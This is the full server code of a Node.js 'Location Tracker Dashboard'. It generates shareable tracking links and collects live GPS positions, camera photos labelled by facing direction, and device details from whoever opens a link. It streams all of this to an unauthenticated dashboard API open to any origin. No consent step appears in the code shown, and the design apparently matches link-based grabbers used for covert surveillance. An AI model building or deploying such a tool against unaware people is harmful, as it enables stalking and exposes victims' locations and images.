const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const cors = require('cors');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: '*' }
});

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// In-memory store
const trackers = new Map();   // trackerId -> tracker data
const locations = new Map();  // trackerId -> [location entries]
const photos = new Map();     // trackerId -> [photo entries]

// ── API Routes ──────────────────────────────────────────────

// Create a new tracker session
app.post('/api/tracker/create', (req, res) => {
  const id = uuidv4().slice(0, 8);
  const tracker = {
    id,
    name: req.body.name || `Tracker ${id}`,
    createdAt: new Date().toISOString(),
    active: false,
    lastLocation: null,
    deviceInfo: null
  };
  trackers.set(id, tracker);
  locations.set(id, []);
  photos.set(id, []);
  res.json({ success: true, tracker, link: `${req.protocol}://${req.get('host')}/track/${id}` });
});

// Get all trackers
app.get('/api/trackers', (req, res) => {
  const all = Array.from(trackers.values()).map(t => ({
    ...t,
    locationCount: locations.get(t.id)?.length || 0,
    photoCount: photos.get(t.id)?.length || 0
  }));
  res.json(all);
});

// Get single tracker
app.get('/api/tracker/:id', (req, res) => {
  const tracker = trackers.get(req.params.id);
  if (!tracker) return res.status(404).json({ error: 'Tracker not found' });
  res.json({
    ...tracker,
    locations: locations.get(req.params.id) || [],
    photos: photos.get(req.params.id) || []
  });
});

// Delete tracker
app.delete('/api/tracker/:id', (req, res) => {
  const id = req.params.id;
  trackers.delete(id);
  locations.delete(id);
  photos.delete(id);
  io.emit('tracker-deleted', id);
  res.json({ success: true });
});

// ── Socket.io ───────────────────────────────────────────────

io.on('connection', (socket) => {
  console.log('Client connected:', socket.id);

  // User opens tracking link and joins
  socket.on('join-tracker', (trackerId) => {
    socket.join(`tracker:${trackerId}`);
    socket.trackerId = trackerId;
    const tracker = trackers.get(trackerId);
    if (tracker) {
      tracker.active = true;
      io.emit('tracker-updated', tracker);
    }
  });

  // Dashboard joins to watch a specific tracker
  socket.on('watch-tracker', (trackerId) => {
    socket.join(`tracker:${trackerId}`);
  });

  // Location update from tracked device
  socket.on('location-update', (data) => {
    const { trackerId, latitude, longitude, accuracy, altitude, speed, heading } = data;
    if (!trackers.has(trackerId)) return;

    const entry = {
      latitude,
      longitude,
      accuracy,
      altitude,
      speed,
      heading,
      timestamp: new Date().toISOString()
    };

    const locArr = locations.get(trackerId);
    locArr.push(entry);

    const tracker = trackers.get(trackerId);
    tracker.lastLocation = entry;
    tracker.active = true;

    // Broadcast to dashboard watchers
    io.to(`tracker:${trackerId}`).emit('location-received', { trackerId, location: entry });
    io.emit('tracker-updated', tracker);
  });

  // Photo capture from tracked device
  socket.on('photo-capture', (data) => {
    const { trackerId, image, facing } = data;
    if (!trackers.has(trackerId)) return;

    const entry = {
      image,
      facing,
      timestamp: new Date().toISOString()
    };

    photos.get(trackerId).push(entry);
    io.to(`tracker:${trackerId}`).emit('photo-received', { trackerId, photo: entry });
  });

  // Device info from tracked device
  socket.on('device-info', (data) => {
    const { trackerId, info } = data;
    if (!trackers.has(trackerId)) return;
    const tracker = trackers.get(trackerId);
    tracker.deviceInfo = info;
    io.emit('tracker-updated', tracker);
  });

  socket.on('disconnect', () => {
    if (socket.trackerId && trackers.has(socket.trackerId)) {
      const tracker = trackers.get(socket.trackerId);
      tracker.active = false;
      io.emit('tracker-updated', tracker);
    }
    console.log('Client disconnected:', socket.id);
  });
});

// ── Track page route ────────────────────────────────────────
app.get('/track/:id', (req, res) => {
  const tracker = trackers.get(req.params.id);
  if (!tracker) return res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
  res.sendFile(path.join(__dirname, 'public', 'track.html'));
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`\n  🟢 Location Tracker Dashboard running at http://localhost:${PORT}\n`);
});
